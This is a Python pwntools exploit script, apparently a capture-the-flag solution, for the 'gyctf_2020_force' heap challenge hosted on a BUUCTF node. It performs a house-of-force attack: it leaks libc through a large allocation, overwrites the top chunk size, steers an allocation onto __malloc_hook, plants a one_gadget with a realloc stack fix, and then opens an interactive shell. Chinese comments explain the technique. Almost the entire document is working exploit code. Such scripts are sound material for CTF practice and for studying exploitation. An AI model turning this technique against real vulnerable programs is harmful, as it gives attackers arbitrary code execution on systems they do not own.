from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './gyctf_2020_force'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',28582) if argv[1]=='r' else process(binary)
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def bytes2int(content):
	return str(content,encoding='utf-8')

def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b'2:puts',b'1')
    sla(b'size',int2bytes(len))
    ru(b'bin addr ')
    bin_addr = int(bytes2int(ru(b'\n')),16)
    sa(b'content',content)
    return bin_addr



def show():
    sl(b'2')


# def edit(index,size,content):
#     sla(b'Your choice:',b'3')
#     sla(b':',int2bytes(index))
#     sla(b':', int2bytes(size))
#     sa(b':', content)
#
#
# def delete(index):
#     sla(b'Your choice:',b'4')
#     sla(b':',int2bytes(index))

#house of force
# 往低地址就是两者 (low_addr - 0x10) - top_addr，往高地址，就是 (high_addr - 0x10 - top_addr) - 0x10
#
# 这里要注意一个细节
# 第二次申请的时候，申请后的 top chunk size 不能小于 MINSIZE (0x10)，即申请前的 malloc 堆块要大于申请 size + MINSIZE。
# 否则会触发重新申请 top chunk，在检测是否对齐的时候就会报错。

libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so')
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]

#leak
bin_addr = add(0x200000)
offset =  0x7fc3ee7b1000 - 0x7fc3ee5b0010 #0x200ff0 #vmmap调试得到
libc.address= bin_addr + offset
malloc_hook = libc.sym['__malloc_hook']
realloc = libc.sym['__libc_realloc']
one_gadget = one_gadget[1] + libc.address

#house of force
payload = 0x10*b'a'+p64(0)+p64(0xffffffffffffffff)
#不能给p64赋值-1，应该是p64问题
heap_addr = add(0x10,payload)#0
top_addr = heap_addr + 0x10


#one_gadget and realloc
offset = malloc_hook - top_addr
add(offset-0x33,b'a')
payload = b'a'*8 + p64(one_gadget) + p64(realloc+0x10)
add(0x10,payload)
#这里是要覆写top chunk到达第一个chunk的地址

sla(b'2:puts', b'1')
sla(b'size', int2bytes(0x10))

itr()

#原理
# 当一个程序存在可以修改top chunk size的漏洞时，我们把top chunk的size修改成0xffffffff(x86)
#
# 假设这个时候的top_chunk=0x601200, 然后malloc(0xffe00020)，然后对malloc申请的size进行检查，0xffe00030 < top_chunk_size，所以可以成功malloc内存，然后计算top_chunk的新地址：0xffe00030+0x601200=0x100401230, 因为是x86环境，最高位溢出了，所以top_chunk=0x401230
#
# 然后下次我们再malloc的时候，返回的地址就是0x401238